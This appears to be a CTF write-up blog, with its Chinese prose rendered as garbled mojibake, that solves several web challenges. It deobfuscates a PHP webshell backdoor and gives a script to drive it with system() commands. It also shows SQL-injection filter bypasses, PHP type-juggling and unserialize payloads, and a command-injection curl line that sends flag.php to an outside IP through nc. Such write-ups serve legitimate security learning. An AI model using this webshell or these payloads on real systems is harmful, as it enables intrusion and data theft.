<p>å¹²ä»–å¦ˆçš„ä»£ç æ··æ·†ï¼å†™ä¸ªpyè„šæœ¬æŠŠä»–ä»¬å…¨éƒ¨æ‹¼åœ¨ä¸€èµ·ä¹‹åæŠŠ)må…¨éƒ¨å»æ‰ï¼Œè®°å¾—è¿‡ç¨‹ä¸­è¦æŠŠé‡Œé¢çš„åŒå¼•å·å…¨éƒ¨ç”¨åæ–œæ è½¬ä¹‰æ‰ã€‚ç„¶åæ‰¾ä¸ªåœ¨çº¿ä»£ç ç¾åŒ–å·¥å…·ç¾åŒ–ä»¥ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str=&quot;$kh=\&quot;4f7)m)mf\&quot;;$kf=\&quot;2)m)m8d7\&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=\&quot;\&quot;;for()m$i=0;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)mR;$rr)m=@$r[)m\&quot;HTT)mP_RE)mFERER\&quot;];$ra)m=)m@$r[\&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m\&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p)marse_)mstr)m($u[\&quot;q)muery\&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m\&quot;/([\w)m])m)[\w-)m]+(?:;q=0.)m([\d)m]))?,?/\&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=\&quot;sub)mstr\&quot;;$sl=\&quot;s)mtrt)molower\&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3)m));)m$p=\&quot;\&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m[$i]=\&quot;\&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif($e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(\&quot;/_)m/\&quot;,\&quot;/-/)m\&quot;),)marray()m\&quot;/\&quot;,\&quot;+\&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(\&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m\&quot;);@sessio)mn_d)mestroy();&quot;</span><br><span class="line">print str.replace(&apos;)m&apos;,&apos;&apos;)</span><br><span class="line">&lt;?php</span><br><span class="line">$kh = &quot;4f7f&quot;;</span><br><span class="line">$kf = &quot;28d7&quot;;</span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;//æ¯ä¸€ä½éƒ½åšä¸€æ¬¡ä¸è¿ç®—</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);//å°†refererçš„queryéƒ¨åˆ†è§£æåˆ°q,ä¹Ÿå°±æ˜¯urlä¸­?åé¢çš„æŸ¥è¯¢æ•°æ®</span><br><span class="line">    $q = array_values($q);//å°†æ•°ç»„çš„å€¼ç»™q</span><br><span class="line">    </span><br><span class="line">    //å¯¹accept_languageè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œæœ€ç»ˆç»“æœä¸ºä¸€ä¸ªåŒ…å«ä¸‰ä¸ª nä¸ªå…ƒç´ çš„æ•°ç»„</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s = &amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][1];//è¿™ä¸ªæ˜¯accept_languageçš„ä»¥æ¯ä¸ªé€—å·ä¸ºåˆ†éš”ç¬¦çš„å‰ä¸¤ä¸ªæ®µçš„é¦–å­—æ¯  ä¸¤ä¸ªå­—æ¯è¿›è¡Œæ‹¼æ¥å¾—åˆ°äº†$i</span><br><span class="line">        $h = $sl($ss(md5($i . $kh) , 0, 3));//$i å’Œ 4f7fæ‹¼æ¥è€Œæˆç»è¿‡md5ä¹‹åçš„å¤´ä¸‰ä½</span><br><span class="line">        $f = $sl($ss(md5($i . $kf) , 0, 3));//$i å’Œ 28d7æ‹¼æ¥è€Œæˆç»è¿‡md5ä¹‹åçš„å¤´ä¸‰ä½</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p.= $q[$m[2][$z]];//æŠŠï¼Ÿåé¢çš„å…ƒç´ ä¸­çš„ç¬¬languageç¼–å·ä¸ªå…ƒç´ æ‹¼æ¥è¿›pä¸­</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;//çœ‹ h æ˜¯å¦åœ¨ p çš„å¼€å¤´</span><br><span class="line">            $s[$i] = &quot;&quot;;//åˆ›å»ºäº†ä¸€ä¸ªç©ºçš„å…ƒç´ </span><br><span class="line">            $p = $ss($p, 3);//å¤´ä¸‰ä½å­—æ¯ä¹‹åçš„ä¸œä¸œ</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;//å¦‚æœiè¿™ä¸ªé”®åœ¨sä¸­å­˜åœ¨~~ä¹Ÿå³æ˜¯è¯´ä¸Šé¢é‚£ä¸ªifä¸€å®šè¦è¿›å»</span><br><span class="line">            $s[$i].= $p;</span><br><span class="line">            $e = strpos($s[$i], $f); //æ‰¾ç»“æŸæ ‡å¿—ï¼Œé‚£ä¸‰ä½md5ç </span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;) , array(&quot;/&quot;,&quot;+&quot;) , substr($s[$i], 0, $e))) , $k)));</span><br><span class="line">                //æŠŠæœ€åçš„ç»“æŸæ ‡å¿—ä¹‹åçš„ä¸œè¥¿å»æ‰ä¹‹åè¿›è¡Œæ“ä½œ  kæ˜¯4f7f28d7 æ‹¿æ¥è¿˜è¦åšä¸€ä¸ªæŒ‰ä½ä¸çš„è¿ç®—</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o) , $k));</span><br><span class="line">                print (&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>åˆ†æè¿‡ç¨‹åœ¨ä»£ç æ³¨é‡Šä¸­ç»™å‡ºäº†ä¸€éƒ¨åˆ†ã€‚è¦é‡ç‚¹å…³æ³¨æˆ‘ä»¬çš„payloadæ˜¯æ€ä¹ˆä¼ é€’è¿›å»çš„ä»¥åŠå…¶ä¸­æ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰ã€‚</p>
<p>è§£é‡Šä»¥ä¸‹accept-languageä¸­çš„<code>zh-CN,zh;q=0.8,zh-TW;q=0.7</code>ï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªä¾‹å­ï¼Œé¦–å…ˆä¸åŒé¡¹ç›®ä¹‹é—´ç”¨é€—å·æ¥åˆ†å‰²å¼€æ¥ï¼Œæœ€å¼€å§‹çš„zh-CNè¡¨ç¤ºé»˜è®¤è¯­è¨€ï¼Œè¿™é‡Œæ˜¯ä¸­å›½å¤§é™†çš„è¯­è¨€ï¼Œç„¶åä¸‹ä¸€ä¸ªæ˜¯zhï¼Œqä»£è¡¨è¿™ä¸ªè¯­è¨€çš„æƒé‡ã€‚é€†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;//æ¯ä¸€ä½éƒ½åšä¸€æ¬¡ä¸è¿ç®—</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function outpayload($cmd)&#123;</span><br><span class="line">    $cmd = &quot;system(&apos;&quot;.$cmd.&quot;&apos;);&quot;;</span><br><span class="line">    $gzcmd = gzcompress($cmd);</span><br><span class="line">    $xgzcmd = x($gzcmd, &quot;4f7f28d7&quot;);</span><br><span class="line">    $paylaod = base64_encode($xgzcmd);</span><br><span class="line"></span><br><span class="line">    return &apos;675&apos;.$paylaod.&apos;a3e&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//è¿™ä¸ªæ˜¯å°†ç½‘é¡µå†…å®¹æ‹¿å›æ¥è§£å¯†çš„å‡½æ•°</span><br><span class="line">function getresult($str)&#123;</span><br><span class="line">    $result = base64_decode($str);</span><br><span class="line">    $result = x($result, &quot;4f7f28d7&quot;);</span><br><span class="line">    $result = gzuncompress($result);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">echo outpayload(&quot;cat this_i5_flag.php&quot;);</span><br><span class="line">echo getresult(&quot;TPqE1x3wTNfRNH6te3Qzh2E2MLfnUeIhki8xAPuCrV5SD41A9JGijSKvng+IEeJe0g9eYHRxchFy092wjmSSQWhmXcQj5A==&quot;);</span><br></pre></td></tr></table></figure>
<p>ç„¶åburpsuiteå‘é€è¯·æ±‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /Challenges/b4ckdo0r.php HTTP/1.1</span><br><span class="line">Host: 751ad4fb456642ada231c61e6ac36d9dcb186eb4b1f14ac1.changame.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.0  //è¦é‡ç‚¹å…³æ³¨è¿™ä¸ª0.0å’Œè¿™ä¸€è¡Œçš„å…ƒç´ ä¸ªæ•°</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=166f2f5e071449-0f8f8e0b614dd6-4c312979-144000-166f2f5e07416b; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; __jsluid=76c3e9ad4068b3acc239c7ac441a05ba</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Referer:http://1.1.1.1/index.php?a=675TPocyB4WLfrhNngoHmlM/vxKuakGtSv8fSrgTfoQNOCAYDfe2zKYa3e</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾çš„ä¸œè¥¿æ”¾è¿›è§£ç å‡½æ•°é‡Œé¢è·‘ä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚</p>
<h2 id="in-a-mess">in a mess</h2>
<p>é¢˜ç›®é“¾æ¥<br>
è¿›å…¥ä¹‹åæŸ¥çœ‹æºç å¾—åˆ°ä»¥ä¸‹æºç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!--index.phps--&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: index.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Hahahahahaha&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;//substrå‡½æ•°ä¸ä¼šå¿½ç•¥%00ä½†æ˜¯strlenä¼šå¿½ç•¥ï¼Œeregiçš„æ¯”è¾ƒæ˜¯å¼±ç±»å‹</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url/index.php?id=0a&amp;b=%0011111111&amp;a=php://input</span><br><span class="line">post: 1112 is a nice lab!</span><br></pre></td></tr></table></figure>
<p>ç„¶åå¾—åˆ°ä¸€ä¸ªurlè·¯å¾„,è¿›å»å‘ç°åŸæ¥çš„urlåé¢è‡ªåŠ¨å¢åŠ äº†index.php?id=1ï¼Œæœ‰å¯èƒ½æ˜¯sqlæ³¨å…¥ï¼Œè¿™é‡Œç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨<code>/**/è¢«è¿‡æ»¤ï¼Œä½¿ç”¨/*1*/å¯ä»¥ç»•è¿‡</code>ã€‚</p>
<p>unionå’Œselectã€fromå‡è¢«è¿‡æ»¤ï¼Œä¾é <code>åŒå†™</code>æ¥ç»•è¿‡ã€‚</p>
<p>æ³¨æ„çˆ†å‡ºè¡¨æ˜ä¹‹åæƒ³è¦è·å–åˆ—åç›´æ¥åœ¨whereä¸­å†™<code>where table_name=&quot;content&quot;</code>ä¸è¡Œï¼Œä½†æ˜¯å¯ä»¥<code>16è¿›åˆ¶</code>æ¥ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,(seleselectct/*1*/group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74)</span><br><span class="line"></span><br><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,(seleselectct/*1*/group_concat(id,context,title)/*1*/frfromom/*1*/content)</span><br></pre></td></tr></table></figure>
<h2 id="babyphp-boot2root">babyphp (boot2root)</h2>
<p>é¢˜ç›®æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$str1 = $_GET[<span class="string">'1'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123; <span class="comment">//ä½¿ç”¨0e215962017ï¼Œå®ƒçš„md5å€¼0e291242476940776845150308577824ï¼Œå½“ç„¶ä¸å”¯ä¸€ï¼Œç”Ÿæˆè„šæœ¬å’ŒéªŒè¯æ–¹æ³•è§ä¸‹</span></span><br><span class="line">        <span class="keyword">echo</span> $flag1; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$str2 = $_GET[<span class="string">'2'</span>]; </span><br><span class="line">$str3 = $_GET[<span class="string">'3'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123; <span class="comment">#ä¼ å…¥ä¸¤ä¸ªæ•°ç»„è¿™æ ·éƒ½æ˜¯falseäº†ï¼Œå½“ç„¶å¯ä»¥ç›¸ç­‰</span></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123; </span><br><span class="line">            <span class="keyword">echo</span> $flag2; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $temp; </span><br><span class="line">    <span class="keyword">var</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123; </span><br><span class="line">    $str4 = $_GET[<span class="string">'4'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; </span><br><span class="line">        $str4=stripslashes($str4); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    $res = unserialize($str4); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($res) &#123; </span><br><span class="line">	$res-&gt;flag=$flag3; </span><br><span class="line">	<span class="comment">#ä½¿ç”¨å¼•ç”¨</span></span><br><span class="line"><span class="comment">/* &lt;?php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">class Secrets &#123;</span></span><br><span class="line"><span class="comment">    var $temp;</span></span><br><span class="line"><span class="comment">    var $flag;</span></span><br><span class="line"><span class="comment">    function __construct()</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $this-&gt;temp = &amp;$this-&gt;flag;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">echo serialize(new Secrets()); */</span></span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp) </span><br><span class="line">            <span class="keyword">echo</span> $res-&gt;flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆpayloadä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:&#123;s:4:%22flag%22;N;s:4:%22temp%22;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>md5ç”Ÿæˆè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŠ„dalaoçš„è„šæœ¬</span></span><br><span class="line"><span class="comment">#-*-encode:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateMD5</span><span class="params">()</span>:</span></span><br><span class="line">    pattern = <span class="string">"^0+e[0-9]+$"</span></span><br><span class="line">    <span class="comment"># è¢«è¯†åˆ«æˆè‹¥å¹²0å¼€å¤´åŠ ä¸Šeå¼€å¤´çš„å¼ºåˆ¶ç±»å‹è½¬æ¢åä¼šè¢«è§†ä¸ºç§‘å­¦è®¡æ•°æ³•ä¸­çš„0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">1000000</span> ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        s = <span class="string">'0e'</span>+str(i)</span><br><span class="line">        md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">        flag = re.search(pattern,md5)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"source:"</span>,str(s))</span><br><span class="line">            print(<span class="string">"md5:"</span>,str(md5))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generateMD5()</span><br></pre></td></tr></table></figure>
<p>éªŒè¯æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashlib.md5(&quot;0e215962017&quot;.encode(&apos;utf-8&apos;)).hexdigest()</span><br></pre></td></tr></table></figure>
<h2 id="pingserver-boot2root">pingserver(boot2root)</h2>
<p>æŸ¥çœ‹<code>helper.php~</code>(ä¸ºä»€ä¹ˆæˆ‘å°±æ‰«æä¸å‡ºæ¥å‘¢ï¼Ÿï¼Ÿï¼Ÿ)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"REMOTE_ADDR"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_CLIENT_IP"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"REMOTE_ADDR"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$ip = <span class="string">"Unknown"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $data))) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">    $black_list = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">" "</span>,<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="comment">// if(strpos($data, $key) !== false)&#123;</span></span><br><span class="line">        <span class="comment">//     die("&lt;center&gt; Not Allowed &lt;/center&gt;");</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        $data = str_replace($key, <span class="string">''</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å­¦ä¹ äº†<code>refip</code>çš„å¸¸è§è®¾ç½®ï¼Œè¿™é‡Œå‘ç°æ²¡æœ‰æ‹¦æˆª<code>x-forwarded-for</code>ï¼Œäºæ˜¯åœ¨è¯·æ±‚å¤´é‡Œé¢æ·»åŠ å¹¶èµ‹å€¼ä¸º<code>127.0.0.1</code>ï¼Œå‘é€ï¼Œå›æ˜¾ç»“æœä¸­çš„å…³é”®ä»£ç å¦‚ä¸‹å›¾ï¼š<br>
<img src="https://user-images.githubusercontent.com/40637063/55333592-3290fb00-54ca-11e9-8816-f316ed169091.png" alt></p>
<p><code>ping -c 4</code>è¡¨ç¤ºå‘é€å››ä¸ªæŠ¥æ–‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http://3.17.167.161/PingService/ --data &quot;ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;207.148.64.125$&#123;IFS%?&#125;8000&quot; --header &quot;x-forwarded-for:127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
<p>æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå°†åˆ†å‰²ç¬¦å·ä¸­çš„<code>%?</code>å»æ‰ä¹Ÿæ˜¯å¯ä»¥çš„<br>
<img src="https://user-images.githubusercontent.com/40637063/55333654-58b69b00-54ca-11e9-8279-d88d243c7cff.png" alt></p>
<h2 id="dragonscim-workshop">dragonscim workshop</h2>
<p>çœŸçš„è„‘æ´é¢˜ç›®ï¼Œé¢˜ç›®æç¤ºï¼š</p>
<blockquote>
<p>DragonScim is holding itâ€™s PKing workshop again!<br>
Word on the street is the admins get into the console via the Contact.<br>
They thought it might be clever and crafty if they also just created<br>
their name with inspiration from fish that collide with themselves.<br>
Oh, and lastly, theyâ€™ve left a joke for us.<br>
Here it is:<br>
How do you kill a circus?<br>
You go for the juggler.<br>
Also, the admins love Maryland a lotâ€¦ Theyâ€™ve been there 5 times.</p>
</blockquote>
<p>è¿™ä¸ªæç¤ºå’Œè°œè¯­ä¸€æ ·æ™¦æ¶©éš¾æ‡‚ã€‚ç„¶åæ ¹æ®æç¤ºçœ‹èµ·æ¥åªèƒ½åˆ©ç”¨contactç•Œé¢ä¸­çš„nameå‚æ•°æ¥æ‰¾çªç ´å£äº†ã€‚ä¼ å…¥çš„<code>urlï¼š/contact.php?name[]=aaa</code>,æŠ¥é”™ã€‚</p>
<blockquote>
<p>Warning: md5() expects parameter 1 to be string,<br>
array given in /var/www/site/contact.php on line 76<br>
